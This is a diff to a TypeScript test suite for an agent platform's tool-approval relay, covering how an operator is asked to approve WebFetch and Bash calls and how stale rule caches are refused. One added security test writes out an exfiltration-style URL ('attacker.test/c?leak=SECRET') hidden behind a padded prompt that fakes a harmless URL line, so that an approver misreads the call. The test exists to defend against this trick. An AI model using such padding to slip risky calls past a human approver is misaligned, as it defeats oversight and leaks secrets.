@@ -6,6 +6,8 @@ import { CallLedger } from "../src/lib/calls";
 import { admin, adminJson, connectHost, eventually, nextCommands, received, runDue, sessionGone, sleep, uniqueCell, Ws } from "./helpers";
 
 const SESSION = "ses_5f0c1a2e-8b7d-4c3e-9a10-2f6d4b8e1c73";
+/** An `approval_check`'s cache version past any these tests reach: its rules are current. */
+const CURRENT = 1_000_000;
 const agentStub = (id: string) => env.AGENT.get(env.AGENT.idFromName(id));
 
 async function setup(opts: { captain?: boolean } = {}) {
@@ -262,7 +264,7 @@ describe("platform tool relay", () => {
     const { ws, ack } = await connectRunner(s.agent, s.host.host, s.host.host_token);
     expect(ack.rule_approvals).toBe(true);
     const check = async (request: string, input: unknown) => {
-      ws.send({ type: "approval_check", request, call: `cal_${request}`, tool: "WebFetch", input });
+      ws.send({ type: "approval_check", request, call: `cal_${request}`, tool: "WebFetch", input, cache_version: CURRENT });
       return (await ws.next("approval_checked", (m) => m.request === request)).outcome;
     };
     const answer = (ask: string, text: string) => adminJson(`/v1/agents/${s.agent}/asks/${ask}/answer`, { body: { answer: text } });
@@ -272,8 +274,13 @@ describe("platform tool relay", () => {
     const first = await check("req_1", docs);
     expect(first).toEqual({ status: "pending", ask: expect.stringMatching(/^ask_/) });
     const asks = await adminJson(`/v1/agents/${s.agent}/asks`);
-    expect(asks).toEqual([{ ask: first.ask, question: expect.stringContaining("WebFetch"), created_ms: expect.any(Number), approval: { name: "WebFetch", tool: "WebFetch" } }]);
-    expect(asks[0].question).toContain("cal_req_1");
+    const canonical = JSON.stringify({ prompt: "p", url: "https://docs.rs/serde" });
+    expect(asks).toEqual([{
+      ask: first.ask, question: expect.stringContaining("WebFetch"), created_ms: expect.any(Number), approval: { name: "WebFetch", tool: "WebFetch" },
+      input: docs, input_bytes: canonical.length,
+    }]);
+    // One field a line, the deciding one (the URL) first.
+    expect(asks[0].question.split("\n")).toEqual(["Allow WebFetch? (request cal_req_1; options: approve | deny)", '  url: "https://docs.rs/serde"', '  prompt: "p"']);
     // The model tries again before the operator answers: the same ask (its arguments' keys in another order).
     expect(await check("req_2", { prompt: "p", url: "https://docs.rs/serde" })).toEqual(first);
     expect(await adminJson(`/v1/agents/${s.agent}/asks`)).toHaveLength(1);
@@ -289,8 +296,8 @@ describe("platform tool relay", () => {
     expect(other.status).toBe("pending");
     expect(other.ask).not.toBe(first.ask);
     // Two identical calls at once: one goes through on the approval, the other is asked again.
-    ws.send({ type: "approval_check", request: "req_4", call: "cal_req_4", tool: "WebFetch", input: docs });
-    ws.send({ type: "approval_check", request: "req_5", call: "cal_req_5", tool: "WebFetch", input: docs });
+    ws.send({ type: "approval_check", request: "req_4", call: "cal_req_4", tool: "WebFetch", input: docs, cache_version: CURRENT });
+    ws.send({ type: "approval_check", request: "req_5", call: "cal_req_5", tool: "WebFetch", input: docs, cache_version: CURRENT });
     const both = await Promise.all(["req_4", "req_5"].map(async (r) => (await ws.next("approval_checked", (m) => m.request === r)).outcome));
     expect(both.filter((o) => o.status === "approved")).toEqual([{ status: "approved", ask: first.ask }]);
     const again = both.find((o) => o.status === "pending")!;
@@ -307,7 +314,7 @@ describe("platform tool relay", () => {
     const s = await setup();
     const { ws } = await connectRunner(s.agent, s.host.host, s.host.host_token);
     const check = async (w: Ws, request: string) => {
-      w.send({ type: "approval_check", request, call: `cal_${request}`, tool: "mcp__nest__Bash", input: { command: "git push" } });
+      w.send({ type: "approval_check", request, call: `cal_${request}`, tool: "mcp__nest__Bash", input: { command: "git push" }, cache_version: CURRENT });
       return (await w.next("approval_checked", (m) => m.request === request)).outcome;
     };
     const held = await check(ws, "req_1");
@@ -333,6 +340,51 @@ describe("platform tool relay", () => {
     expect(await check(next, "req_4")).toEqual({ status: "approved", ask: held.ask });
     expect((await check(next, "req_5")).status).toBe("pending");
     next.close();
+  });
+
+  it("approval_check: the operator sees the deciding argument first and whole, and every argument on its own line", async () => {
+    const s = await setup();
+    const { ws } = await connectRunner(s.agent, s.host.host, s.host.host_token);
+    // Security review of #244: a long `prompt` (sorted before `url`) pushed the URL out of a 2,000-character
+    // question, and padding could fake a harmless-looking end.
+    const evil = "https://attacker.test/c?leak=SECRET";
+    const prompt = `${"a".repeat(2100)}","url":"https://docs.rs/serde"}\n  url: "https://docs.rs/serde"`;
+    ws.send({ type: "approval_check", request: "req_e", call: "cal_e", tool: "WebFetch", input: { prompt, url: evil }, cache_version: CURRENT });
+    const held = (await ws.next("approval_checked", (m) => m.request === "req_e")).outcome;
+    expect(held.status).toBe("pending");
+    const [ask] = await adminJson(`/v1/agents/${s.agent}/asks`);
+    const lines: string[] = ask.question.split("\n");
+    expect(lines).toHaveLength(3);
+    expect(lines[1]).toBe(`  url: "${evil}"`);
+    expect(lines[2]).toMatch(/^ {2}prompt: "a{100}/);
+    expect(lines[2]).toContain("(2");
+    expect(ask.question).not.toContain("docs.rs/serde\"}\n");
+    // And the whole input, as it would run.
+    expect(ask.input).toEqual({ prompt, url: evil });
+    ws.close();
+  });
+
+  it("approval_check: a rule changed since the runner's cache wins over a check against the old one", async () => {
+    const s = await setup();
+    const { ws } = await connectRunner(s.agent, s.host.host, s.host.host_token);
+    const before = (await ws.next("cache_update")).cache.version as number;
+    const check = async (request: string, cache_version: number) => {
+      ws.send({ type: "approval_check", request, call: `cal_${request}`, tool: "WebFetch", input: { url: "https://x.test" }, cache_version });
+      return (await ws.next("approval_checked", (m) => m.request === request)).outcome;
+    };
+    const held = await check("req_1", before);
+    await adminJson(`/v1/agents/${s.agent}/asks/${held.ask}/answer`, { body: { answer: "approve" } });
+    // The operator then denies WebFetch outright; a check made against the cache before that (in flight,
+    // or queued across a reconnect) is refused, and the approval isn't spent on it.
+    await adminJson(`/v1/agents/${s.agent}/rules`, { method: "PUT", body: [{ pattern: "WebFetch", decision: "deny" }] });
+    const now = (await ws.next("cache_update", (m) => m.cache.rules.length === 1)).cache.version as number;
+    expect(await check("req_2", now - 1)).toMatchObject({ status: "error", error: { code: "conflict" } });
+    const unspent = await runInDurableObject(agentStub(s.agent), (_i: AgentDO, st) =>
+      st.storage.sql.exec<{ used_by: string | null }>("SELECT used_by FROM approvals WHERE ask = ?", held.ask).one().used_by);
+    expect(unspent).toBeNull();
+    // A check against the current rules is answered (the runner sends one only if a rule still asks).
+    expect(await check("req_3", now)).toEqual({ status: "approved", ask: held.ask });
+    ws.close();
   });
 
   it("enforces roles, validates arguments, and reports unimplemented tools", async () => {
